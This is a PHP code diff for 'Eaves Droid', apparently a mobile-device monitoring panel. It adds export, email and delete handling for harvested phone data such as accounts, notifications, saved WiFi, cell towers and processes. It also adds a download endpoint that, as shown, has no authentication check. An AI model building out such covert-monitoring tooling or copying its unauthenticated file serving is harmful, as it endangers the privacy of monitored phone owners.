@@ -1290,6 +1290,46 @@ class Account extends BaseClientController
                     ];
                     $filename = 'location_history_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
                     break;
+                case 'misc_software':
+                    $data = [
+                        'device_context' => $this->finderModel->export_device_context($this->userId),
+                        'network_info' => $this->finderModel->export_network_info($this->userId),
+                        'accounts' => $this->finderModel->export_accounts($this->userId),
+                        'calendar' => $this->finderModel->export_calendar_events($this->userId),
+                        'app_usage' => $this->finderModel->export_app_usage($this->userId),
+                        'notifications' => $this->finderModel->export_notifications($this->userId),
+                        'accessibility' => $this->finderModel->export_accessibility($this->userId),
+                        'input_methods' => $this->finderModel->export_input_methods($this->userId),
+                        'security_audit' => $this->finderModel->export_security_audit($this->userId),
+                        'proc_info' => $this->finderModel->export_proc_info($this->userId),
+                        'data_usage' => $this->finderModel->export_data_usage($this->userId),
+                        'saved_wifi' => $this->finderModel->export_saved_wifi($this->userId),
+                        'default_apps' => $this->finderModel->export_default_apps($this->userId),
+                        'alarms' => $this->finderModel->export_alarms($this->userId),
+                        'app_security' => $this->finderModel->export_app_security($this->userId),
+                        'network_security' => $this->finderModel->export_network_security($this->userId),
+                        'telephony_network' => $this->finderModel->export_telephony_network($this->userId),
+                        'system_locale' => $this->finderModel->export_system_locale($this->userId),
+                    ];
+                    $filename = 'misc_software_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
+                    break;
+                case 'misc_hardware':
+                    $data = [
+                        'hardware_graphics' => $this->finderModel->export_hardware_graphics($this->userId),
+                        'hardware_network' => $this->finderModel->export_hardware_network($this->userId),
+                        'camera_info' => $this->finderModel->export_camera_info($this->userId),
+                        'battery_stats' => $this->finderModel->export_battery_stats($this->userId),
+                        'sensors' => $this->finderModel->export_sensors($this->userId),
+                        'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
+                        'cell_towers' => $this->finderModel->export_cell_towers($this->userId),
+                        'display_info' => $this->finderModel->export_display_info($this->userId),
+                        'storage' => $this->finderModel->export_storage($this->userId),
+                        'thermal' => $this->finderModel->export_thermal($this->userId),
+                        'nfc' => $this->finderModel->export_nfc($this->userId),
+                        'processes' => $this->finderModel->export_processes($this->userId),
+                    ];
+                    $filename = 'misc_hardware_export_' . date('Y-m-d_H-i-s') . ($format === 'csv' ? '.csv' : '.json');
+                    break;
                 case 'advanced':
                     $data = [
                         'device_context' => $this->finderModel->export_device_context($this->userId),
@@ -1324,6 +1364,40 @@ class Account extends BaseClientController
                             'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
                             'sensors' => $this->finderModel->export_sensors($this->userId),
                         ],
+                        'misc_software' => [
+                            'device_context' => $this->finderModel->export_device_context($this->userId),
+                            'network_info' => $this->finderModel->export_network_info($this->userId),
+                            'accounts' => $this->finderModel->export_accounts($this->userId),
+                            'calendar' => $this->finderModel->export_calendar_events($this->userId),
+                            'app_usage' => $this->finderModel->export_app_usage($this->userId),
+                            'notifications' => $this->finderModel->export_notifications($this->userId),
+                            'accessibility' => $this->finderModel->export_accessibility($this->userId),
+                            'input_methods' => $this->finderModel->export_input_methods($this->userId),
+                            'security_audit' => $this->finderModel->export_security_audit($this->userId),
+                            'proc_info' => $this->finderModel->export_proc_info($this->userId),
+                            'data_usage' => $this->finderModel->export_data_usage($this->userId),
+                            'saved_wifi' => $this->finderModel->export_saved_wifi($this->userId),
+                            'default_apps' => $this->finderModel->export_default_apps($this->userId),
+                            'alarms' => $this->finderModel->export_alarms($this->userId),
+                            'app_security' => $this->finderModel->export_app_security($this->userId),
+                            'network_security' => $this->finderModel->export_network_security($this->userId),
+                            'telephony_network' => $this->finderModel->export_telephony_network($this->userId),
+                            'system_locale' => $this->finderModel->export_system_locale($this->userId),
+                        ],
+                        'misc_hardware' => [
+                            'hardware_graphics' => $this->finderModel->export_hardware_graphics($this->userId),
+                            'hardware_network' => $this->finderModel->export_hardware_network($this->userId),
+                            'camera_info' => $this->finderModel->export_camera_info($this->userId),
+                            'battery_stats' => $this->finderModel->export_battery_stats($this->userId),
+                            'sensors' => $this->finderModel->export_sensors($this->userId),
+                            'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
+                            'cell_towers' => $this->finderModel->export_cell_towers($this->userId),
+                            'display_info' => $this->finderModel->export_display_info($this->userId),
+                            'storage' => $this->finderModel->export_storage($this->userId),
+                            'thermal' => $this->finderModel->export_thermal($this->userId),
+                            'nfc' => $this->finderModel->export_nfc($this->userId),
+                            'processes' => $this->finderModel->export_processes($this->userId),
+                        ],
                         'export_info' => [
                             'exported_at' => date('Y-m-d H:i:s'),
                             'user_id' => $this->userId,
@@ -1348,6 +1422,99 @@ class Account extends BaseClientController
                 ['new_values' => json_encode(['export_type' => $label, 'format' => $format])]
             );
             $this->updateExportCount();
+
+            // Send notification email
+            $userEmail = auth()->user()->getEmail();
+            if ($userEmail) {
+                $sizeEstimate = $this->estimateDataSize($data);
+                $breakdownHtml = '';
+                if ($type === 'misc_software' && isset($data['accounts'])) {
+                    $subItems = [
+                        'fa-user' => ['Accounts', $data['accounts']],
+                        'fa-calendar-alt' => ['Calendar', $data['calendar']],
+                        'fa-chart-bar' => ['App Usage', $data['app_usage']],
+                        'fa-bell' => ['Notifications', $data['notifications']],
+                        'fa-info-circle' => ['Device Context', $data['device_context']],
+                        'fa-network-wired' => ['Network Info', $data['network_info']],
+                        'fa-universal-access' => ['Accessibility', $data['accessibility']],
+                        'fa-keyboard' => ['Input Methods', $data['input_methods']],
+                        'fa-shield-alt' => ['Security Audit', $data['security_audit']],
+                        'fa-microchip' => ['Proc Info', $data['proc_info']],
+                        'fa-chart-line' => ['Data Usage', $data['data_usage']],
+                        'fa-wifi' => ['Saved WiFi', $data['saved_wifi']],
+                        'fa-th-list' => ['Default Apps', $data['default_apps']],
+                        'fa-clock' => ['Alarms', $data['alarms']],
+                        'fa-lock' => ['App Security', $data['app_security']],
+                        'fa-shield-virus' => ['Network Security', $data['network_security']],
+                        'fa-sim-card' => ['Telephony Network', $data['telephony_network']],
+                        'fa-language' => ['System Locale', $data['system_locale']],
+                    ];
+                    $breakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4><table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                    foreach ($subItems as $icon => $info) {
+                        $count = is_array($info[1]) ? count($info[1]) : (is_numeric($info[1]) ? (int)$info[1] : 0);
+                        $breakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
+                    }
+                    $breakdownHtml .= '</table>';
+                } elseif ($type === 'misc_hardware' && isset($data['hardware_graphics'])) {
+                    $subItems = [
+                        'fa-palette' => ['Hardware Graphics', $data['hardware_graphics']],
+                        'fa-network-wired' => ['Hardware Network', $data['hardware_network']],
+                        'fa-camera' => ['Camera Info', $data['camera_info']],
+                        'fa-battery-full' => ['Battery Stats', $data['battery_stats']],
+                        'fa-ruler' => ['Sensors', $data['sensors']],
+                        'fa-bluetooth-b' => ['Bluetooth', $data['bluetooth']],
+                        'fa-broadcast-tower' => ['Cell Towers', $data['cell_towers']],
+                        'fa-tv' => ['Display Info', $data['display_info']],
+                        'fa-hdd' => ['Storage', $data['storage']],
+                        'fa-thermometer-half' => ['Thermal', $data['thermal']],
+                        'fa-credit-card' => ['NFC', $data['nfc']],
+                        'fa-tasks' => ['Processes', $data['processes']],
+                    ];
+                    $breakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4><table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                    foreach ($subItems as $icon => $info) {
+                        $count = is_array($info[1]) ? count($info[1]) : (is_numeric($info[1]) ? (int)$info[1] : 0);
+                        $breakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $info[0] . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
+                    }
+                    $breakdownHtml .= '</table>';
+                }
+
+                $this->sendNotificationEmail(
+                    $userEmail,
+                    'Eaves Droid — Export Initiated: ' . $label,
+                    '
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"></head>
+<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
+<div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
+<div style="background:#28a745;padding:20px;text-align:center;"><h1 style="color:#fff;margin:0;font-size:22px;">📦 Export Initiated</h1></div>
+<div style="padding:25px;">
+<p style="color:#333;font-size:15px;">Hello,</p>
+<p style="color:#333;font-size:15px;">A data export has been initiated from your <strong>Eaves Droid</strong> account. The file is being downloaded to your browser.</p>
+<table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $label . '</td></tr>
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Format</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . strtoupper($format) . '</td></tr>
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Estimated Size</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $sizeEstimate . '</td></tr>
+<tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Exported At</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
+</table>' . $breakdownHtml . '
+<div style="background:#e8fde8;border-left:4px solid #28a745;padding:12px 15px;margin:15px 0;border-radius:4px;">
+<p style="margin:0;color:#333;font-size:13px;"><strong>🔒 Important:</strong> This file contains sensitive data. Keep it secure.</p>
+</div>
+<p style="color:#333;font-size:15px;">If you did not request this export, please contact support immediately.</p>
+<p style="color:#333;font-size:15px;">Thank you,<br><strong>Eaves Droid Team</strong></p>
+<div style="margin-top:20px;padding:12px 15px;background:#e9ecef;border-radius:6px;font-size:11px;color:#555;">
+<table style="width:100%;border-collapse:collapse;">
+<tr><td style="padding:2px 5px;"><strong>Action:</strong> Data Export</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Status:</strong> <span style="color:#28a745;font-weight:bold;">Success</span></td></tr>
+<tr><td style="padding:2px 5px;"><strong>Browser:</strong> ' . htmlspecialchars($this->request->getUserAgent()->getAgentString() ?: '') . '</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Browser IP:</strong> ' . $this->request->getIPAddress() . '</td></tr>
+<tr><td style="padding:2px 5px;"><strong>Executed At:</strong> ' . date('Y-m-d H:i:s') . '</td></tr>
+</table>
+</div>
+</div>
+<div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">Eaves Droid — Advanced Mobile Forensic &amp; Data Intelligence Platform</div>
+</div></body></html>'
+                );
+            }
 
             if ($format === 'csv') {
                 return $this->exportAsCsv($data, $type, $filename);
@@ -1376,6 +1543,8 @@ class Account extends BaseClientController
      */
     public function exportEmail()
     {
+        ini_set('memory_limit', '512M');
+
         if (!$this->request->isAJAX()) {
             return $this->fail('Invalid request');
         }
@@ -1401,11 +1570,49 @@ class Account extends BaseClientController
                 case 'locations':
                     $data = ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)];
                     break;
+                case 'misc_software':
+                    $data = [
+                        'device_context' => $this->finderModel->export_device_context($this->userId),
+                        'network_info' => $this->finderModel->export_network_info($this->userId),
+                        'accounts' => $this->finderModel->export_accounts($this->userId),
+                        'calendar' => $this->finderModel->export_calendar_events($this->userId),
+                        'app_usage' => $this->finderModel->export_app_usage($this->userId),
+                        'notifications' => $this->finderModel->export_notifications($this->userId),
+                        'accessibility' => $this->finderModel->export_accessibility($this->userId),
+                        'input_methods' => $this->finderModel->export_input_methods($this->userId),
+                        'security_audit' => $this->finderModel->export_security_audit($this->userId),
+                        'proc_info' => $this->finderModel->export_proc_info($this->userId),
+                        'data_usage' => $this->finderModel->export_data_usage($this->userId),
+                        'saved_wifi' => $this->finderModel->export_saved_wifi($this->userId),
+                        'default_apps' => $this->finderModel->export_default_apps($this->userId),
+                        'alarms' => $this->finderModel->export_alarms($this->userId),
+                        'app_security' => $this->finderModel->export_app_security($this->userId),
+                        'network_security' => $this->finderModel->export_network_security($this->userId),
+                        'telephony_network' => $this->finderModel->export_telephony_network($this->userId),
+                        'system_locale' => $this->finderModel->export_system_locale($this->userId),
+                    ];
+                    break;
+                case 'misc_hardware':
+                    $data = [
+                        'hardware_graphics' => $this->finderModel->export_hardware_graphics($this->userId),
+                        'hardware_network' => $this->finderModel->export_hardware_network($this->userId),
+                        'camera_info' => $this->finderModel->export_camera_info($this->userId),
+                        'battery_stats' => $this->finderModel->export_battery_stats($this->userId),
+                        'sensors' => $this->finderModel->export_sensors($this->userId),
+                        'bluetooth' => $this->finderModel->export_bluetooth($this->userId),
+                        'cell_towers' => $this->finderModel->export_cell_towers($this->userId),
+                        'display_info' => $this->finderModel->export_display_info($this->userId),
+                        'storage' => $this->finderModel->export_storage($this->userId),
+                        'thermal' => $this->finderModel->export_thermal($this->userId),
+                        'nfc' => $this->finderModel->export_nfc($this->userId),
+                        'processes' => $this->finderModel->export_processes($this->userId),
+                    ];
+                    break;
                 case 'advanced':
                     $data = ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)];
                     break;
                 case 'all':
-                    $data = ['apps' => $this->finderModel->get_apps($this->userId, 10000), 'calls' => $this->finderModel->get_call_logs($this->userId, 10000), 'contacts' => $this->finderModel->get_contacts($this->userId, 10000), 'sms' => $this->finderModel->get_sms($this->userId, 10000), 'files' => $this->finderModel->export_device_files($this->userId, 10000), 'location' => ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)], 'advanced' => ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)]];
+                    $data = ['apps' => $this->finderModel->get_apps($this->userId, 10000), 'calls' => $this->finderModel->get_call_logs($this->userId, 10000), 'contacts' => $this->finderModel->get_contacts($this->userId, 10000), 'sms' => $this->finderModel->get_sms($this->userId, 10000), 'files' => $this->finderModel->export_device_files($this->userId, 10000), 'location' => ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)], 'advanced' => ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)], 'misc_software' => ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'accessibility' => $this->finderModel->export_accessibility($this->userId), 'input_methods' => $this->finderModel->export_input_methods($this->userId), 'security_audit' => $this->finderModel->export_security_audit($this->userId), 'proc_info' => $this->finderModel->export_proc_info($this->userId), 'data_usage' => $this->finderModel->export_data_usage($this->userId), 'saved_wifi' => $this->finderModel->export_saved_wifi($this->userId), 'default_apps' => $this->finderModel->export_default_apps($this->userId), 'alarms' => $this->finderModel->export_alarms($this->userId), 'app_security' => $this->finderModel->export_app_security($this->userId), 'network_security' => $this->finderModel->export_network_security($this->userId), 'telephony_network' => $this->finderModel->export_telephony_network($this->userId), 'system_locale' => $this->finderModel->export_system_locale($this->userId)], 'misc_hardware' => ['hardware_graphics' => $this->finderModel->export_hardware_graphics($this->userId), 'hardware_network' => $this->finderModel->export_hardware_network($this->userId), 'camera_info' => $this->finderModel->export_camera_info($this->userId), 'battery_stats' => $this->finderModel->export_battery_stats($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'cell_towers' => $this->finderModel->export_cell_towers($this->userId), 'display_info' => $this->finderModel->export_display_info($this->userId), 'storage' => $this->finderModel->export_storage($this->userId), 'thermal' => $this->finderModel->export_thermal($this->userId), 'nfc' => $this->finderModel->export_nfc($this->userId), 'processes' => $this->finderModel->export_processes($this->userId)]];
                     break;
                 default: return $this->fail('Invalid type.');
             }
@@ -1414,6 +1621,52 @@ class Account extends BaseClientController
             $filename = $type . '_export_' . date('Y-m-d_H-i-s') . '.json';
             $tmpPath = WRITEPATH . 'uploads/' . $filename;
             file_put_contents($tmpPath, $content);
+
+            // Build breakdown HTML for misc types before data is unset
+            $exportBreakdownHtml = '';
+            if ($type === 'misc_software' && isset($data['accounts'])) {
+                $subItems = [
+                    'fa-user' => 'Accounts', 'fa-calendar-alt' => 'Calendar', 'fa-chart-bar' => 'App Usage',
+                    'fa-bell' => 'Notifications', 'fa-info-circle' => 'Device Context', 'fa-network-wired' => 'Network Info',
+                    'fa-universal-access' => 'Accessibility', 'fa-keyboard' => 'Input Methods', 'fa-shield-alt' => 'Security Audit',
+                    'fa-microchip' => 'Proc Info', 'fa-chart-line' => 'Data Usage', 'fa-wifi' => 'Saved WiFi',
+                    'fa-th-list' => 'Default Apps', 'fa-clock' => 'Alarms', 'fa-lock' => 'App Security',
+                    'fa-shield-virus' => 'Network Security', 'fa-sim-card' => 'Telephony Network', 'fa-language' => 'System Locale',
+                ];
+                $exportBreakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4>
+                <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                foreach ($subItems as $icon => $label) {
+                    $key = strtolower(str_replace([' ', '-'], '_', $label));
+                    $keys = ['accounts','calendar','app_usage','notifications','device_context','network_info','accessibility','input_methods','security_audit','proc_info','data_usage','saved_wifi','default_apps','alarms','app_security','network_security','telephony_network','system_locale'];
+                    $idx = array_search($key, $keys);
+                    $val = array_values(array_slice($data, 0, 18))[$idx] ?? [];
+                    $count = is_array($val) ? count($val) : 0;
+                    $exportBreakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $label . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
+                }
+                $exportBreakdownHtml .= '</table>';
+            } elseif ($type === 'misc_hardware' && isset($data['hardware_graphics'])) {
+                $subItems = [
+                    'fa-palette' => 'Hardware Graphics', 'fa-network-wired' => 'Hardware Network',
+                    'fa-camera' => 'Camera Info', 'fa-battery-full' => 'Battery Stats',
+                    'fa-ruler' => 'Sensors', 'fa-bluetooth-b' => 'Bluetooth',
+                    'fa-broadcast-tower' => 'Cell Towers', 'fa-tv' => 'Display Info',
+                    'fa-hdd' => 'Storage', 'fa-thermometer-half' => 'Thermal',
+                    'fa-credit-card' => 'NFC', 'fa-tasks' => 'Processes',
+                ];
+                $exportBreakdownHtml = '<h4 style="margin:20px 0 10px;font-size:15px;">📊 Data Breakdown</h4>
+                <table style="width:100%;border-collapse:collapse;background:#f8f9fa;border-radius:6px;">';
+                $idx = 0;
+                foreach ($subItems as $icon => $label) {
+                    $val = array_values($data)[$idx] ?? [];
+                    $count = is_array($val) ? count($val) : 0;
+                    $exportBreakdownHtml .= '<tr><td style="padding:8px 12px;border-bottom:1px solid #dee2e6;"><i class="fas ' . $icon . '" style="margin-right:8px;"></i>' . $label . '</td><td style="padding:8px 12px;text-align:right;border-bottom:1px solid #dee2e6;">' . number_format($count) . ' records</td></tr>';
+                    $idx++;
+                }
+                $exportBreakdownHtml .= '</table>';
+            }
+
+            unset($data);
+            unset($content);
 
             $db = \Config\Database::connect();
             $smtpSettings = [];
@@ -1465,6 +1718,7 @@ class Account extends BaseClientController
             $label = $typeLabels[$type] ?? ucfirst($type);
             $fileSize = filesize($tmpPath);
             $sizeStr = $fileSize > 1048576 ? number_format($fileSize / 1048576, 2) . ' MB' : number_format($fileSize / 1024, 1) . ' KB';
+            $downloadUrl = base_url('downloads/export/' . $filename);
 
             $email->setSubject('Eaves Droid — ' . $label . ' Export');
             $email->setMessage('
@@ -1478,7 +1732,13 @@ class Account extends BaseClientController
         </div>
         <div style="padding:25px;">
             <p style="color:#333;font-size:15px;line-height:1.6;">Hello,</p>
-            <p style="color:#333;font-size:15px;line-height:1.6;">Your requested data export from <strong>Eaves Droid</strong> is now available. The file is attached to this email.</p>
+            <p style="color:#333;font-size:15px;line-height:1.6;">Your requested data export from <strong>Eaves Droid</strong> is now ready. You can download it using the link below:</p>
+
+            <div style="background:#e8f4fd;border:1px solid #b0d4f1;border-radius:6px;padding:12px 15px;margin:15px 0;text-align:center;">
+                <p style="margin:0 0 8px;color:#333;font-size:14px;">📥 <strong>Download your export file:</strong></p>
+                <a href="' . esc($downloadUrl) . '" style="display:inline-block;background:#007bff;color:#fff;padding:10px 24px;border-radius:4px;text-decoration:none;font-weight:bold;font-size:14px;">Download ' . esc($label) . ' Export</a>
+                <p style="margin:8px 0 0;color:#888;font-size:12px;">Link expires after 24 hours</p>
+            </div>
 
             <table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
                 <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $label . '</td></tr>
@@ -1486,6 +1746,7 @@ class Account extends BaseClientController
                 <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">File Size</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $sizeStr . '</td></tr>
                 <tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Generated</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
             </table>
+            ' . $exportBreakdownHtml . '
 
             <div style="background:#e8f4fd;border-left:4px solid #007bff;padding:12px 15px;margin:15px 0;border-radius:4px;">
                 <p style="margin:0;color:#333;font-size:13px;line-height:1.5;">
@@ -1502,16 +1763,14 @@ class Account extends BaseClientController
     </div>
 </body>
 </html>');
-            $email->attach($tmpPath);
 
             if ($email->send()) {
-                @unlink($tmpPath);
-                $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'Location History','advanced'=>'Advanced Data','all'=>'All Data'];
+            $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'Location History','misc_software'=>'Misc Software','misc_hardware'=>'Misc Hardware','advanced'=>'Advanced Data','all'=>'All Data'];
                 $label = $exportLabel[$type] ?? ucfirst($type);
                 $this->logUserAction('exported_' . $type . '_via_email', 'system', 'low', 1,
                     ['new_values' => json_encode(['export_type' => $label, 'format' => $format, 'recipient' => $recipient, 'file_size' => $fileSize])]
                 );
-                return $this->respond(['success' => true, 'message' => 'Export sent to ' . $recipient]);
+                return $this->respond(['success' => true, 'message' => 'Export link has been sent to ' . $recipient]);
             } else {
                 @unlink($tmpPath);
                 return $this->respond(['success' => false, 'message' => 'Email send failed: ' . $email->printDebugger(['headers', 'subject', 'body'])]);
@@ -1520,6 +1779,25 @@ class Account extends BaseClientController
             log_message('error', 'Email export error: ' . $e->getMessage());
             return $this->fail('Server error: ' . $e->getMessage());
         }
+    }
+
+    /**
+     * Serves an exported JSON file for download. File is kept for 24 hours then auto-deleted.
+     */
+    public function downloadExport(string $filename)
+    {
+        $tmpPath = WRITEPATH . 'uploads/' . basename($filename);
+        if (!file_exists($tmpPath)) {
+            return $this->fail('File not found or expired.', 404);
+        }
+
+        // Auto-clean files older than 24 hours
+        if (time() - filemtime($tmpPath) > 86400) {
+            @unlink($tmpPath);
+            return $this->fail('Download link has expired.', 410);
+        }
+
+        return $this->response->download($tmpPath, null)->setFileName(basename($filename, '.json') . '.json');
     }
 
     /**
@@ -1680,6 +1958,44 @@ class Account extends BaseClientController
                     $success = $this->finderModel->deleteLocationByUser($this->userId) && $this->finderModel->deleteActivityByUser($this->userId);
                     $message = 'All location and activity history deleted successfully';
                     break;
+                case 'misc_software':
+                    $deletedCount = $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_accessibility_services', $this->userId) + $this->finderModel->cq('tbl_input_methods', $this->userId) + $this->finderModel->cq('tbl_security_audit', $this->userId) + $this->finderModel->cq('tbl_proc_info', $this->userId) + $this->finderModel->cq('tbl_data_usage', $this->userId) + $this->finderModel->cq('tbl_saved_wifi', $this->userId) + $this->finderModel->cq('tbl_default_apps', $this->userId) + $this->finderModel->cq('tbl_alarms', $this->userId) + $this->finderModel->cq('tbl_app_security', $this->userId) + $this->finderModel->cq('tbl_network_security', $this->userId) + $this->finderModel->cq('tbl_telephony_network', $this->userId) + $this->finderModel->cq('tbl_system_locale', $this->userId);
+                    $success = $this->finderModel->deleteDeviceContextByUser($this->userId) &&
+                               $this->finderModel->deleteNetworkInfoByUser($this->userId) &&
+                               $this->finderModel->deleteAccountsByUser($this->userId) &&
+                               $this->finderModel->deleteCalendarByUser($this->userId) &&
+                               $this->finderModel->deleteAppUsageByUser($this->userId) &&
+                               $this->finderModel->deleteNotificationsByUser($this->userId) &&
+                               $this->finderModel->deleteAccessibilityByUser($this->userId) &&
+                               $this->finderModel->deleteInputMethodsByUser($this->userId) &&
+                               $this->finderModel->deleteSecurityAuditByUser($this->userId) &&
+                               $this->finderModel->deleteProcInfoByUser($this->userId) &&
+                               $this->finderModel->deleteDataUsageByUser($this->userId) &&
+                               $this->finderModel->deleteSavedWifiByUser($this->userId) &&
+                               $this->finderModel->deleteDefaultAppsByUser($this->userId) &&
+                               $this->finderModel->deleteAlarmsByUser($this->userId) &&
+                               $this->finderModel->deleteAppSecurityByUser($this->userId) &&
+                               $this->finderModel->deleteNetworkSecurityByUser($this->userId) &&
+                               $this->finderModel->deleteTelephonyNetworkByUser($this->userId) &&
+                               $this->finderModel->deleteSystemLocaleByUser($this->userId);
+                    $message = 'All misc software data deleted successfully';
+                    break;
+                case 'misc_hardware':
+                    $deletedCount = $this->finderModel->cq('tbl_hardware_graphics', $this->userId) + $this->finderModel->cq('tbl_hardware_network', $this->userId) + $this->finderModel->cq('tbl_camera_info', $this->userId) + $this->finderModel->cq('tbl_battery_stats', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_cell_towers', $this->userId) + $this->finderModel->cq('tbl_display_info', $this->userId) + $this->finderModel->cq('tbl_storage', $this->userId) + $this->finderModel->cq('tbl_thermal', $this->userId) + $this->finderModel->cq('tbl_nfc', $this->userId) + $this->finderModel->cq('tbl_running_processes', $this->userId);
+                    $success = $this->finderModel->deleteHardwareGraphicsByUser($this->userId) &&
+                               $this->finderModel->deleteHardwareNetworkByUser($this->userId) &&
+                               $this->finderModel->deleteCameraInfoByUser($this->userId) &&
+                               $this->finderModel->deleteBatteryStatsByUser($this->userId) &&
+                               $this->finderModel->deleteSensorsByUser($this->userId) &&
+                               $this->finderModel->deleteBluetoothByUser($this->userId) &&
+                               $this->finderModel->deleteCellTowersByUser($this->userId) &&
+                               $this->finderModel->deleteDisplayInfoByUser($this->userId) &&
+                               $this->finderModel->deleteStorageByUser($this->userId) &&
+                               $this->finderModel->deleteThermalByUser($this->userId) &&
+                               $this->finderModel->deleteNfcByUser($this->userId) &&
+                               $this->finderModel->deleteProcessesByUser($this->userId);
+                    $message = 'All misc hardware data deleted successfully';
+                    break;
                 case 'advanced':
                     $deletedCount = $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId);
                     $success = $this->finderModel->deleteDeviceContextByUser($this->userId) &&
